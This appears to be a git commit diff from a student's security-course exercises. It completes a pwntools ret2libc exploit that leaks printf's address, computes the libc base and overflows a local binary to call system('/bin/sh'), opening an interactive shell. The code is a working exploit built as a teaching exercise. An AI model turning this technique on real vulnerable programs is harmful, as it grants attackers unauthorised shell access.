73d6635cef62cfc418b39b393f1199adbb810437
Lachlan <lachlanwaugh8@gmail.com>
2023-11-07 10:21:37 +1100

    updated directory names and fixed ret2libc solution.

--- week7/ret2libc/solve.py
+++ week7/ret2libc/solve.py
@@ -3,19 +3,19 @@ from pwn import *
 context.log_level = 'ERROR'
 
 p = process('./ret2libc')
-libc = ELF('./libc6_2.27-3ubuntu1_i386.so')
+
+# this is my version of libc, update the path to yours
+# or use patchelf to change it to the provided one
+libc = ELF('/usr/lib32/libc.so.6')
 
 p.recvuntil(b': ')
 printf = int(p.recvuntil(b'\n', drop=True), 16)
 libc.address = printf - libc.symbols['printf']
 
-print(hex(printf - 0x512d0 + 0x3d200))
-print(hex(printf))
-print(hex(libc.symbols['system']))
-
 payload = b'A' * 0x14
 payload += p32(libc.symbols['system'])  # system_plt
-# payload += p32() # /bin/sh
+payload += p32(libc.symbols['exit'])
+payload += p32(next(libc.search(b'/bin/sh')))
 
 p.sendline(payload)
 p.interactive()
